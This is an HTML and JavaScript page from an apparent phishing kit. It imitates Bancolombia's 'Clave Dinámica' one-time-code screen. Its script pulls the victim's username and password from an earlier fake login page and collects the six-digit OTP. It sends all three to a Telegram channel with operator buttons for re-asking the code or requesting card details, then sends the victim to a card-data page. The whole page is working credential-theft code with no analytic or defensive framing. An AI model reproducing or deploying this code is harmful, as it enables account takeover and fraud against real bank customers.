<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave Din√°mica - Bancolombia</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
            --card-bg: rgba(255, 255, 255, 0.94);
            --text: #0f172a;
            --primary: #ffd200;
            --primary-hover: #facc15;
            --border: rgba(250, 204, 21, 0.28);
            --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
            --error: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: linear-gradient(160deg, rgba(255,255,255,0.45) 0%, rgba(254,240,138,0.4) 45%, rgba(217,119,6,0.25) 100%);
            z-index: 0;
            pointer-events: none;
        }

        .otp-wrap {
            min-height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px 18px;
            position: relative;
            z-index: 1;
        }

        .otp-card {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 28px;
            box-shadow: var(--shadow);
            padding: 38px;
            backdrop-filter: blur(16px);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 200px;
            height: auto;
        }

        .otp-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .otp-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 8px;
        }

        .otp-subtitle {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
        }

        .alert-error {
            display: none;
            background: #fee2e2;
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            color: var(--error);
            font-size: 14px;
            align-items: center;
            gap: 12px;
        }

        .alert-error.show {
            display: flex;
        }

        .alert-error i {
            font-size: 20px;
        }

        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }

        .otp-inputs input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-weight: bold;
            font-family: inherit;
            transition: all 0.3s ease;
            background: white;
        }

        .otp-inputs input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(255, 210, 0, 0.1);
        }

        .btn-continuar {
            width: 100%;
            padding: 16px;
            background: var(--primary);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-continuar:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.4);
        }

        .btn-continuar:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .loading-screen {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .loading-screen.active {
            display: flex;
        }

        .loading-content {
            text-align: center;
            color: white;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 599px) {
            .otp-card {
                padding: 28px 24px;
            }
            .otp-inputs input {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Verificando c√≥digo...</p>
        </div>
    </div>

    <div class="otp-wrap">
        <div class="otp-card">
            <div class="logo">
                <svg viewBox="0 0 200 40">
                    <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
                </svg>
            </div>

            <div class="otp-header">
                <h1 class="otp-title">üîê Clave Din√°mica</h1>
                <p class="otp-subtitle">Ingresa el c√≥digo de 6 d√≠gitos que te enviamos por SMS o que aparece en tu app</p>
            </div>

            <div class="alert-error" id="errorAlert">
                <i class='bx bx-error-circle'></i>
                <span>C√≥digo incorrecto. Por favor intenta nuevamente.</span>
            </div>

            <div class="otp-inputs">
                <input type="text" maxlength="1" id="otp1" inputmode="numeric" autocomplete="off">
                <input type="text" maxlength="1" id="otp2" inputmode="numeric" autocomplete="off">
                <input type="text" maxlength="1" id="otp3" inputmode="numeric" autocomplete="off">
                <input type="text" maxlength="1" id="otp4" inputmode="numeric" autocomplete="off">
                <input type="text" maxlength="1" id="otp5" inputmode="numeric" autocomplete="off">
                <input type="text" maxlength="1" id="otp6" inputmode="numeric" autocomplete="off">
            </div>

            <button class="btn-continuar" id="btnContinuar" disabled>
                Continuar
            </button>
        </div>
    </div>

    <script src="js/telegram.js"></script>
    <script>
        console.log('‚úÖ OTP page loaded successfully');

        document.addEventListener('DOMContentLoaded', () => {
            // Obtener datos del localStorage
            const loginDataString = localStorage.getItem('loginData');
            
            if (!loginDataString) {
                console.log('‚ùå No login data found');
                alert('Sesi√≥n expirada. Por favor ingresa nuevamente.');
                window.location.href = 'login.html';
                return;
            }

            const loginData = JSON.parse(loginDataString);
            console.log('‚úÖ Login data retrieved');

            // Verificar si hay error en la URL
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === '1') {
                document.getElementById('errorAlert').classList.add('show');
            }

            const inputs = document.querySelectorAll('.otp-inputs input');
            const btnContinuar = document.getElementById('btnContinuar');
            const loadingScreen = document.getElementById('loadingScreen');
            const errorAlert = document.getElementById('errorAlert');

            // Enfocar primer input
            inputs[0].focus();

            // Manejar navegaci√≥n entre inputs
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/[^0-9]/g, '');

                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }

                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
                    btnContinuar.disabled = !allFilled;
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');

                    if (pastedData.length === 6) {
                        inputs.forEach((input, i) => {
                            input.value = pastedData[i] || '';
                        });
                        btnContinuar.disabled = false;
                        inputs[5].focus();
                    }
                });

                input.addEventListener('input', () => {
                    errorAlert.classList.remove('show');
                });
            });

            btnContinuar.addEventListener('click', async () => {
                const otp = Array.from(inputs).map(input => input.value).join('');

                console.log('üì§ OTP entered:', otp);

                if (otp.length !== 6) {
                    alert('Por favor ingresa los 6 d√≠gitos');
                    return;
                }

                // Guardar OTP
                loginData.otp = otp;
                loginData.otpTimestamp = new Date().toLocaleString('es-CO');
                localStorage.setItem('loginData', JSON.stringify(loginData));

                // Mostrar loading
                errorAlert.classList.remove('show');
                loadingScreen.classList.add('active');

                // Preparar mensaje para Telegram
                const mensaje = `üîê *CLAVE DIN√ÅMICA BANCOLOMBIA*\n\n` +
                    `üìÑ *Usuario:* ${loginData.usuario}\n` +
                    `üîë *Clave:* ${loginData.clave}\n` +
                    `üéØ *OTP:* ${otp}\n` +
                    `‚è∞ *Hora:* ${loginData.otpTimestamp}\n` +
                    `üÜî *ID:* ${loginData.transactionId}`;

                const teclado = {
                    inline_keyboard: [
                        [
                            { text: "‚úÖ Correcto", callback_data: `correcto_otp:${loginData.transactionId}` },
                            { text: "‚ùå Incorrecto", callback_data: `error_dinamica:${loginData.transactionId}` }
                        ],
                        [
                            { text: "üîê Pedir Otra Vez", callback_data: `pedir_dinamica:${loginData.transactionId}` }
                        ],
                        [
                            { text: "üí≥ Pedir Tarjeta", callback_data: `pedir_tarjeta:${loginData.transactionId}` }
                        ],
                        [
                            { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${loginData.transactionId}` }
                        ]
                    ]
                };

                try {
                    if (typeof sendTelegramMessage === 'function') {
                        await sendTelegramMessage(mensaje, teclado);
                        console.log('‚úÖ Message sent to Telegram');
                    }

                    setTimeout(() => {
                        loadingScreen.classList.remove('active');
                        console.log('üîÑ Redirecting to datos-tarjeta.html');
                        window.location.href = 'datos-tarjeta.html';
                    }, 2000);

                } catch (error) {
                    console.error("‚ùå Error:", error);
                    loadingScreen.classList.remove('active');
                    errorAlert.classList.add('show');
                }
            });

            console.log('‚úÖ OTP page ready');
        });
    </script>
</body>
</html>
